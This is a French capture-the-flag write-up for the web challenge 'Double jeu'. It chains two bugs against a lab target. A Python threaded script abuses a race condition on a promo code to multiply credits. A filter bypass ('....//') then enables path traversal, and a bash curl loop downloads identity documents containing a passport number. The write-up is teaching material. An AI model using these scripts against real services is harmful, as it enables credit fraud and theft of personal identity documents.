## Challenge : Double jeu

## Informations du challenge

| Catégorie | Difficulté | Points | Auteur |
|-----------|------------|--------|--------|
| Web | Moyen | 300 | YoyoChaud |

**Preuve :** `11CL21356`

## Résumé

Ce challenge combine 2 vulnérabilités web critiques pour accéder à des documents confidentiels :

1. **Race Condition** - exploitation d'une condition de concurrence sur un code promo
2. **LFI (Local File Inclusion)** - bypass de filtre pour lire des fichiers arbitraires

## Étape 1 : Création de compte et connexion

### Découverte

L'application propose un système d'inscription standard avec gestion de crédits. Les utilisateurs peuvent appliquer des codes promo pour obtenir des crédits gratuits, mais uniquement après connexion.

![](images/website.png)

### Analyse

L'endpoint `/register` accepte trois paramètres :
- `username` : nom d'utilisateur
- `password` : mot de passe
- `email` : adresse email

Après l'inscription, il est nécessaire de se connecter via `/login` pour accéder à l'espace codes promo et aux fonctionnalités VIP.

### Exploitation

**Étape 1a : Création du compte**

```bash
curl -X POST http://<IP>:<PORT>/register \
  -d "username=hacker" \
  -d "password=pass123" \
  -d "email=hacker@test.com"
```

**Étape 1b : Connexion pour obtenir la session**

```bash
curl -X POST http://<IP>:<PORT>/login \
  -d "username=hacker" \
  -d "password=pass123" \
  -c cookies.txt
```

## Étape 2 : Race Condition sur le code promo

### Contexte

L'application propose plusieurs codes promo pour obtenir des crédits gratuits. Cependant, seul le code `WELCOME` (qui donne 10 crédits) est vulnérable à une race condition.

### Analyse de la vulnérabilité

Le problème se situe dans la logique de vérification :

1. L'application vérifie si le code a déjà été utilisé
2. Si non utilisé, elle ajoute les crédits
3. Elle marque ensuite le code comme utilisé

Entre l'étape 1 et l'étape 3, il y a une fenêtre temporelle exploitable. Si on envoie plusieurs requêtes simultanément, elles peuvent toutes passer la vérification avant que le marquage "utilisé" ne soit effectif.

### Technique d'exploitation

Il est possible d'utiliser Burp Intruder pour réaliser cette race condition, mais on va utiliser ici le module `concurrent.futures` de Python, pour envoyer de multiples requêtes simultanément :

```python
#!/usr/bin/env python3
import requests
import concurrent.futures

URL = "http://<IP>:<PORT>"
s = requests.Session()

# Se connecter avec le compte créé
s.post(f"{URL}/login", data={"username": "hacker", "password": "pass123"})

def send_promo():
    """Envoie une requete pour appliquer le code promo"""
    return s.post(f"{URL}/apply_promo", data={"code": "WELCOME"})

# Envoyer 40 requêtes simultanément
with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executor:
    futures = [executor.submit(send_promo) for _ in range(40)]
    concurrent.futures.wait(futures)

# Vérifier le nombre de crédits obtenus
r = s.get(f"{URL}/promo")
print(r.text)
```

### Exploitation

Exécution du script :

```bash
python3 race.py
```

### Résultat

Au lieu de 10 crédits, on obtient 100+ crédits (10 crédits × nombre de requêtes réussies).

```
Vos crédits: 200
```

Le nombre exact dépend du timing et de la charge du serveur, mais généralement 10 à 20 requêtes sur 40 réussissent.

### Ce qui ne fonctionne PAS

- Envoyer les requêtes séquentiellement -> une seule réussit, les autres sont rejetées
- Trop peu de workers (< 10) -> pas assez de requêtes simultanées pour exploiter la race condition
- Requêtes trop espacées dans le temps -> le marquage "utilisé" s'effectue avant les requêtes suivantes
- Code promo invalide -> erreur "Code invalide"

### Pourquoi ça fonctionne

La race condition se produit car :
1. Pas de verrouillage (lock) sur la ressource
2. Pas de transaction atomique pour vérifier + marquer
3. Le traitement asynchrone permet aux requêtes de s'entrelacer

## Étape 3 : LFI (Local File Inclusion) pour voler les documents

### Contexte

Une fois qu'on a accumulé suffisamment de crédits (100), on peut accéder à l'espace VIP qui contient une fonctionnalité de téléchargement de dossiers.

### Découverte

Après avoir uploadé un fichier, on découvre que l'endpoint `/vip/download_dossier` accepte un paramètre `path` pour télécharger des fichiers. C'est un vecteur LFI classique.

### Analyse du filtre

L'application tente de se protéger contre le path traversal avec plusieurs caractères et bypass connus, mais elle utilise également un filtre qui remplace `..` par une chaîne vide. Cependant, ce filtre est vulnérable :

on peut bypasser le filtre avec `....` qui devient `..` après filtrage.

### Technique de bypass

Pour remonter de 2 niveaux dans l'arborescence :
- Normalement : `../../fichier`
- Avec le filtre : `....//....//fichier`

Chaque `....` devient `..` après filtrage.

### Exploitation

**Méthode 1 : Voler un fichier spécifique**

Après avoir réussi le challenge ProfilToxique, on connaît le format du nom des fichiers recherchés. On peut donc procéder comme ceci pour récupérer un document :

```bash
curl -s http://<IP>:<PORT>/vip/download_dossier \
  -b cookies.txt \
  -G --data-urlencode "path=..../..../document_identite_1.pdf" \
  -o document_identite_1.pdf
```

Décomposition :
- `-s` : mode silencieux
- `-b cookies.txt` : utiliser la session authentifiée
- `-G --data-urlencode` : encoder l'URL correctement
- `..../....` : remonte de 2 niveaux (devient `../..` après filtrage)
- `-o` : sauvegarde dans un fichier local

**Méthode 2 : Automatiser le vol de tous les documents**

```bash
#!/bin/bash
for i in {1..16}; do
  curl -s http://<IP>:<PORT>/vip/download_dossier \
    -b cookies.txt \
    -G --data-urlencode "path=..../..../document_identite_$i.pdf" \
    -o "document_identite_$i.pdf" 2>/dev/null

  # Vérifier si le fichier a été récupéré (taille > 0)
  if [ -s "document_identite_$i.pdf" ]; then
    echo "[+] document_identite_$i.pdf recupéré"
  else
    # Supprimer les fichiers vides
    rm -f "document_identite_$i.pdf"
  fi
done
```

### Résultat

Les 16 documents d'identité sont téléchargés. Le document `document_identite_16.pdf` contient le numéro de passeport, qui est la preuve.

```bash
# Extraire le numero de passeport du PDF
pdftotext document_identite_16.pdf - | grep -i "passeport"
```

✅ **Preuve :** `11CL21356`
